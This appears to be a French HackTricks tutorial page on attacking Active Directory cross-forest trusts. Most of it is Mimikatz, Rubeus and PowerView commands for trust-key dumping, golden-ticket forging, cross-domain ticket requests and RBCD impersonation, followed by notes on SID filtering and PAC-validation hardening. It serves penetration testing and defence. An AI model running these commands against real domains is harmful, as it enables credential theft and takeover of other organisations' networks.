# Domaine de forêt externe - OneWay (Inbound) ou bidirectionnel

{{#include ../../banners/hacktricks-training.md}}

Dans ce scénario, un domaine externe vous fait confiance (ou vous vous faites mutuellement confiance), ce qui vous permet d'obtenir une forme d'accès à celui-ci.

## Énumération

Tout d'abord, vous devez **énumérer** la **relation d'approbation** :
```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM

# Get name of DC of the other domain
Get-DomainComputer -Domain domain.external -Properties DNSHostName
dnshostname
-----------
dc.domain.external

# Groups that contain users outside of its domain and return its members
Get-DomainForeignGroupMember -Domain domain.external
GroupDomain             : domain.external
GroupName               : Administrators
GroupDistinguishedName  : CN=Administrators,CN=Builtin,DC=domain,DC=external
MemberDomain            : domain.external
MemberName              : S-1-5-21-3263068140-2042698922-2891547269-1133
MemberDistinguishedName : CN=S-1-5-21-3263068140-2042698922-2891547269-1133,CN=ForeignSecurityPrincipals,DC=domain,
DC=external

# Get name of the principal in the current domain member of the cross-domain group
ConvertFrom-SID S-1-5-21-3263068140-2042698922-2891547269-1133
DEV\External Admins

# Get members of the cros-domain group
Get-DomainGroupMember -Identity "External Admins" | select MemberName
MemberName
----------
crossuser

# Lets list groups members
## Check how the "External Admins" is part of the Administrators group in that DC
Get-NetLocalGroupMember -ComputerName dc.domain.external
ComputerName : dc.domain.external
GroupName    : Administrators
MemberName   : SUB\External Admins
SID          : S-1-5-21-3263068140-2042698922-2891547269-1133
IsGroup      : True
IsDomain     : True

# You may also enumerate where foreign groups and/or users have been assigned
# local admin access via Restricted Group by enumerating the GPOs in the foreign domain.

# Additional trust hygiene checks (AD RSAT / AD module)
Get-ADTrust -Identity domain.external -Properties SelectiveAuthentication,SIDFilteringQuarantined,SIDFilteringForestAware,TGTDelegation,ForestTransitive
```
> `SelectiveAuthentication`/`SIDFiltering*` permettent de déterminer rapidement si les chemins d’abus cross-forest (RBCD, SIDHistory) sont susceptibles de fonctionner sans prérequis supplémentaires.<sup>[[2]](#references)</sup>

Lors de l’énumération précédente, il a été constaté que l’utilisateur **`crossuser`** appartient au groupe **`External Admins`**, qui dispose d’un **Admin access** sur le **DC du domaine externe**.

## Accès initial

Si vous n’avez trouvé aucun accès **spécial** pour votre utilisateur dans l’autre domaine, vous pouvez toujours revenir à l’AD Methodology et tenter un **privesc depuis un utilisateur non privilégié** (par exemple, avec le kerberoasting) :

Vous pouvez utiliser les **fonctions Powerview** pour **énumérer** l’**autre domaine** en utilisant le paramètre `-Domain`, comme dans :
```bash
Get-DomainUser -SPN -Domain domain_name.local | select SamAccountName
```
{{#ref}}
./
{{#endref}}

## Impersonation

### Connexion

En utilisant une méthode classique avec les identifiants des utilisateurs qui ont accès au domaine externe, vous devriez pouvoir y accéder :
```bash
Enter-PSSession -ComputerName dc.external_domain.local -Credential domain\administrator
```
### Abus de SID History

Vous pouvez également exploiter [**SID History**](sid-history-injection.md) à travers une relation d’approbation entre forêts.

Si un utilisateur est migré **d’une forêt vers une autre** et que le **SID Filtering n’est pas activé**, il devient possible **d’ajouter un SID provenant de l’autre forêt**, et ce **SID** sera **ajouté** au **token de l’utilisateur** lors de l’authentification **à travers la relation d’approbation**.

> [!WARNING]
> Pour rappel, vous pouvez obtenir la clé de signature avec
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.domain.local
> ```

Vous pourriez **signer avec** la clé **de confiance** un **TGT usurpant l’identité** de l’utilisateur du domaine actuel.
```bash
# Get a TGT for the cross-domain privileged user to the other domain
Invoke-Mimikatz -Command '"kerberos::golden /user:<username> /domain:<current domain> /SID:<current domain SID> /rc4:<trusted key> /target:<external.domain> /ticket:C:\path\save\ticket.kirbi"'

# Use this inter-realm TGT to request a TGS in the target domain to access the CIFS service of the DC
## We are asking to access CIFS of the external DC because in the enumeration we show the group was part of the local administrators group
Rubeus.exe asktgs /service:cifs/dc.domain.external /domain:dc.domain.external /dc:dc.domain.external /ticket:C:\path\save\ticket.kirbi /nowrap

# Now you have a TGS to access the CIFS service of the domain controller
```
### Méthode complète d'usurpation de l'utilisateur
```bash
# Get a TGT of the user with cross-domain permissions
Rubeus.exe asktgt /user:crossuser /domain:sub.domain.local /aes256:70a673fa756d60241bd74ca64498701dbb0ef9c5fa3a93fe4918910691647d80 /opsec /nowrap

# Get a TGT from the current domain for the target domain for the user
Rubeus.exe asktgs /service:krbtgt/domain.external /domain:sub.domain.local /dc:dc.sub.domain.local /ticket:doIFdD[...snip...]MuSU8= /nowrap

# Use this inter-realm TGT to request a TGS in the target domain to access the CIFS service of the DC
## We are asking to access CIFS of the external DC because in the enumeration we show the group was part of the local administrators group
Rubeus.exe asktgs /service:cifs/dc.domain.external /domain:dc.domain.external /dc:dc.domain.external /ticket:doIFMT[...snip...]5BTA== /nowrap

# Now you have a TGS to access the CIFS service of the domain controller
```
### RBCD cross-forest lorsque vous contrôlez un compte machine dans la forêt de confiance (sans filtrage SID / authentification sélective)

Si votre foreign principal (FSP) vous place dans un groupe capable d’écrire des objets ordinateur dans la forêt de confiance (par ex. `Account Operators`, groupe de provisioning personnalisé), vous pouvez configurer la **Resource-Based Constrained Delegation** sur un hôte cible de cette forêt et usurper l’identité de n’importe quel utilisateur qui s’y trouve :
```bash
# 1) From the trusted domain, create or compromise a machine account (MYLAB$) you control
# 2) In the trusting forest (domain.external), set msDS-AllowedToAct on the target host for that account
Set-ADComputer -Identity victim-host$ -PrincipalsAllowedToDelegateToAccount MYLAB$
# or with PowerView
Set-DomainObject victim-host$ -Set @{'msds-allowedtoactonbehalfofotheridentity'=$sidbytes_of_MYLAB}

# 3) Use the inter-forest TGT to perform S4U to victim-host$ and get a CIFS ticket as DA of the trusting forest
Rubeus.exe s4u /ticket:interrealm_tgt.kirbi /impersonate:EXTERNAL\Administrator /target:victim-host.domain.external /protocol:rpc
```
Cela ne fonctionne que lorsque **SelectiveAuthentication est désactivé** et que le **SID filtering** ne supprime pas votre SID de contrôle. Il s’agit d’un chemin latéral rapide qui évite le forging de SIDHistory et qui est souvent oublié lors des trust reviews.<sup>[[2]](#references)</sup>

### Renforcement de la validation du PAC

Les mises à jour de validation des signatures PAC pour **CVE-2024-26248**/**CVE-2024-29056** imposent la signature des tickets inter-forest. En **Compatibility mode**, les chemins inter-realm forgés via PAC/SIDHistory/S4U peuvent encore fonctionner sur des DC non patchés. En **Enforcement mode**, les données PAC non signées ou altérées qui traversent un forest trust sont rejetées, sauf si vous détenez également la trust key de la forest cible. Les registry overrides (`PacSignatureValidationLevel`, `CrossDomainFilteringLevel`) peuvent affaiblir ce mécanisme tant qu’ils restent disponibles.<sup>[[1]](#references)</sup>

## References

- [1] [Microsoft KB5037754 – Modifications de la validation du PAC pour CVE-2024-26248 et CVE-2024-29056](https://support.microsoft.com/en-au/topic/how-to-manage-pac-validation-changes-related-to-cve-2024-26248-and-cve-2024-29056-6e661d4f-799a-4217-b948-be0a1943fef1)
- [2] [Spécification MS-PAC – Détails du SID filtering et de la transformation des claims](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-pac/55fc19f2-55ba-4251-8a6a-103dd7c66280)
{{#include ../../banners/hacktricks-training.md}}
